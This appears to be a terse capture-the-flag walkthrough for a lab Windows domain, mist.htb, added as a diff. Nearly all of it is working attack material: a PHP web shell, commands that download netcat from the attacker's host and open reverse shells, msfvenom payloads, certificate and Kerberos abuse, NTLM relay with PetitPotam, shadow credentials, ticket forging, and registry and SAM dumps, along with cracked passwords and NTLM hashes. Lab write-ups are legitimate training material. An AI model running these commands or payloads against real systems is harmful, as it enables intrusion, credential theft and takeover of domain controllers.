@@ -1,0 +1,225 @@
+#####  svc_web
+
+curl 'http://mist.htb/data/modules/albums/albums_getimage.php?image=admin_backup.php'
+<?php
+$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
+?>146
+
+## pass it to crackstation.net -> lexypoo97
+
+## get a reverse shell by uploading a new module in http://mist.htb/admin.php?action=installmodule
+
+## first create a shell.php and zip it
+shell.php
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+zip -r new.zip shell.php
+
+upload nc64.exe -> get revershell of svc_web
+
+http://mist.htb/data/modules/new/shell.php?cmd=powershell.exe -c curl http://10.10.14.44/nc64.exe -o \xampp\htdocs\files\nc64.exe
+
+http://mist.htb/data/modules/new/shell.php?cmd=cmd.exe /c \xampp\htdocs\files\nc64.exe 10.10.14.44 9001 -e powershell.exe
+
+setup listen on port 9001
+
+##### Brandon shell
+
+create payload 
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1337 -a x64 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1338 -a x64 -f exe -o shelll.exe
+
+then upload the shell.exe file to the path c:\xampp\htdocs
+
+Execute the following commands in a powershell if you have a cmd switch to powershell:
+
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Common Applications\Calculator.lnk")
+$lnk.TargetPath = "C:\xampp\htdocs\shell.exe"
+$lnk.Save()
+
+setup listen and wait :: nc -lnvp 1337 and nc -lnvp 1338 ( need 2 listen for later setup chisel forward )
+
+upload certify and rubeus -> gain ntlm hash of Bardon :
+
+Then run following command
+
+.\certify.exe request /ca:DC01.mist.htb\mist-DC01-CA /currentuser
+
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+.\rubeus.exe asktgt /getcredentials /user:Brandon.Keywarp /certificate:cert.pfx /d:mist.htb /dc:dc01.mist.htb /show
+
+
+get NTLM hash : DB03D6A77A2205BC1D07082740626CC9
+
+### Start a proxy MS01
+
+Upload chilsel.exe
+
+On server run : 
+
+.\chisel.exe client 10.10.14.44:9999 R:socks
+
+## and 
+
+.\chisel.exe client 10.10.14.44:4444 8080:10.10.14.44:8080
+
+On our machine :
+
+# attacker machine 
+
+chisel server -p 9999 --reverse
+chisel server -p 4444 --reverse
+
+Setup WEBADV : https://gist.github.com/KINGSABRI/e20693b9a1035df7b9d213ce49d004ca
+
+delete : 
+<VirtualHost *:80>
+	# The ServerName directive sets the request scheme, hostname and port that
+	# the server uses to identify itself. This is used when creating
+	# redirection URLs. In the context of virtual hosts, the ServerName
+	# specifies what hostname must appear in the request's Host: header to
+	# match this virtual host. For the default virtual host (this file) this
+	# value is not decisive as it is used as a last resort host regardless.
+	# However, you must set it for any further virtual host explicitly.
+	#ServerName www.example.com
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+	# error, crit, alert, emerg.
+	# It is also possible to configure the loglevel for particular
+	# modules, e.g.
+	#LogLevel info ssl:warn
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+	# For most configuration files from conf-available/, which are
+	# enabled or disabled at a global level, it is possible to
+	# include a line for only one particular virtual host. For example the
+	# following line enables the CGI configuration for this host only
+	# after it has been globally disabled with "a2disconf".
+	#Include conf-available/serve-cgi-bin.conf
+</VirtualHost>
+
+replace : 
+
+DavLockDB /var/www/DavLock
+
+<VirtualHost *:80>
+        # WebDav Configurations
+        Alias / /var/www/webdav
+        <Directory /var/www/webdav>
+                DAV On
+                Options Indexes MultiViews
+                AllowOverride None
+        </Directory>
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+## confirm connect : 
+
+cadaver http://localhost/
+
+## start webdav in MS01 ( in svc_web )
+
+net use n: http://10.10.14.44/
+
+in our machine : 
+
+proxychains crackmapexec smb 192.168.100.101 -u 'Brandon.Keywarp' -H DB03D6A77A2205BC1D07082740626CC9 -M webdav
+
+
+## stop the webdav service so port 80 will be available for ntlmrelay
+
+## start ntlmrelayx :  https://github.com/fortra/impacket/pull/1402
+
+proxychains ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i
+
+# https://github.com/topotam/PetitPotam
+
+proxychains python3 PetitPotam.py -u Brandon.Keywarp -d mist.htb -hashes :DB03D6A77A2205BC1D07082740626CC9 "ms01@8080/test" 192.168.100.101 -pipe all
+
+## after get an output in ntlmrelayx
+
+[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
+
+## connect to port 11000 on localhost
+$ nc localhost 11000
+
+"""
+Follow article above :
+
+# clear_shadow_creds MS01$
+Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
+Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
+
+Shadow credentials cleared successfully!
+
+# set_shadow_creds MS01$
+Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
+Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
+
+KeyCredential generated with DeviceID: 75246ae0-2cb5-632c-8097-ef88077ca8c9
+Shadow credentials successfully added!
+Saved PFX (#PKCS12) certificate & key at path: nRqSFIzD.pfx
+Must be used with password: XcmAdLYcfX0U5zZCCsEF
+"""
+
+<https://github.com/dirkjanm/PKINITtools>
+$ proxychains python3 gettgtpkinit.py -cert-pfx nRqSFIzD.pfx -pfx-pass 'XcmAdLYcfX0U5zZCCsEF' -dc-ip 192.168.100.100 'mist.htb/ms01$' tickhet.ccache
+$ export KRB5CCNAME=tickhet.ccache
+$ proxychains python getnthash.py 'mist.htb/ms01$' -key <key from gettgtpkinit.py>
+4a74fc05400345d580cf58aec3e6d833
+
+$ ticketer.py -nthash 4a74fc05400345d580cf58aec3e6d833 -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -dc-ip 192.168.100.100 -spn HOST/MS01.mist.htb administrator
+$ export KRB5CCNAME=administrator.ccache
+
+$ proxychains nxc smb 192.168.100.101 --use-kcache --sam
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
+
+#### user flag
+$ proxychains evil-winrm -i 192.168.100.101 -u administrator -H 711e6a685af1c31c4029c3c7681dd97b
+
+#### root
+## setup chisel socks proxy
+
+$ proxychains certipy req -u 'svc_cabackup@mist.htb' -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -dns-tcp -dc-ip 192.168.100.100 -template 'ManagerAuthentication' -ca 'mist-DC01-CA' -key-size 4096
+$ certipy auth -pfx svc_cabackup.pfx -domain mist.htb -dns-tcp -dc-ip 192.168.100.100
+$ export KRB5CCNAME=svc_cabackup.ccache
+$ certipy req -u 'svc_cabackup@mist.htb' -k -no-pass -dns-tcp -dc-ip dc01.mist.htb -target dc01.mist.htb -ns 192.168.100.100 -template 'BackupSvcAuthentication' -ca 'mist-DC01-CA' -key-size 4096
+$ certipy auth -pfx svc_cabackup.pfx -domain mist.htb -dns-tcp -dc-ip 192.168.100.100
+$ export KRB5CCNAME=svc_cabackup.ccache
+
+# start smbserver
+$ smbserver.py -smb2support share .
+# dump registry
+$ proxychains impacket-reg.py 'mist.htb/svc_cabackup@dc01.mist.htb' -k -no-pass -dc-ip 192.168.100.100 backup -o '\\10.10.YY.YY\share\'
+$ secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+$ proxychains evil-winrm -i 192.168.100.100 -u administrator -H b46782b9365344abdff1a925601e0385
